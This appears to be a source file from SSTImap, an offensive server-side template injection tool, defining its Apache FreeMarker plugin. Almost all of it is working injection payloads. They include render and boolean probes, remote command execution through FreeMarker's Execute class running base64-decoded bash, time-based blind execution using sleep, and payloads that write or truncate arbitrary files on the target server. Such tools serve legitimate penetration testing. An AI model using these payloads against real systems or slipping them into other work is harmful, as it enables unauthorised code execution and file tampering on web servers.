from utils import rand
from plugins.languages import java


class Freemarker(java.Java):
    priority = 5
    plugin_info = {
        "Description": """Apache Freemarker template engine""",
        "Authors": [
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Updates for SSTImap
        ],
        "Engine": [
            "Homepage: https://freemarker.apache.org/",
            "Github: https://github.com/apache/freemarker",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '${{({header[0]}+{header[1]})?c}}',
                'trailer': '${{({trailer[0]}+{trailer[1]})?c}}',
                'test_render': f"""${{{rand.randints[0]}}}<#--{rand.randints[1]}-->${{{rand.randints[2]}}}""",
                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
            },
            'render_error': {
                'render': '{code}',
                'header': '<#--${{1/0}}-->${{(({header[0]}+{header[1]})?c+',
                'trailer': '+({trailer[0]}+{trailer[1]})?c)?new()}}',
                'test_render': f"""({rand.randints[0]})?c+({rand.randints[2]})?c""",
                'test_render_expected': f'{rand.randints[0]}{rand.randints[2]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "${1/((1.0==1.0)?string('1','0')?eval)}",
                'test_bool_false': "${1/((1.0==0.1)?string('1','0')?eval)}",
                'verify_bool_true':  "${1/((2>1)?string('1','0')?eval)}",
                'verify_bool_false': "${1/((1>2)?string('1','0')?eval)}"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """${{"freemarker.template.utility.Execute"?new()("/bin/bash -c {{echo,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}")?eval }}""",
                'test_eval': '"executed"?replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_error': {
                'call': 'render',
                'evaluate': """("freemarker.template.utility.Execute"?new()("/bin/bash -c {{echo,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}")?eval)"""
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """${{1/("freemarker.template.utility.Execute"?new()("bash -c {{echo,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}")?eval?has_content?string('1','0')?eval) }}"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """${{"freemarker.template.utility.Execute"?new()("bash -c {{echo,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}")?eval?has_content?string("freemarker.template.utility.Execute"?new()("sleep {delay}"),'0') }}"""
            },
            'execute': {
                'call': 'render',
                'execute': """${{"freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}") }}"""
            },
            'execute_error': {
                'call': 'render',
                'execute': """("freemarker.template.utility.Execute"?new()("/bin/bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}"))"""
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            # Hackish way to check success
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """${{1/("freemarker.template.utility.Execute"?new()("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{echo,SSTIMAP}}")?chop_linebreak?ends_with("SSTIMAP")?string('1','0')?eval) }}"""
            },
            # Not using execute here since it's rendered and requires set headers and trailers
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """${{"freemarker.template.utility.Execute"?new()("bash -c {{eval,$({{tr,/+,_-}}<<<{code_b64}|{{base64,-d}})}}&&{{sleep,{delay}}}") }}"""
            },
            'write': {
                'call': 'inject',
                'write': """${{"freemarker.template.utility.Execute"?new()("bash -c {{tr,_-,/+}}<<<{chunk_b64}|{{base64,-d}}>>{path}") }}""",
                'truncate': """${{"freemarker.template.utility.Execute"?new()("bash -c {{echo,-n,}}>{path}") }}""",
            },
        })

        self.language += ':freemarker'

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '', 'closures': java.ctx_closures},
            # This handles <#assign s = %s> and <#if 1 == %s> and <#if %s == 1>
            {'level': 2, 'prefix': '{closure}>', 'suffix': '', 'closures': java.ctx_closures},
            {'level': 5, 'prefix': '-->', 'suffix': '<#--'},
            {'level': 5, 'prefix': '{closure} as a></#list><#list [1] as a>', 'suffix': '', 'closures': java.ctx_closures},
        ])

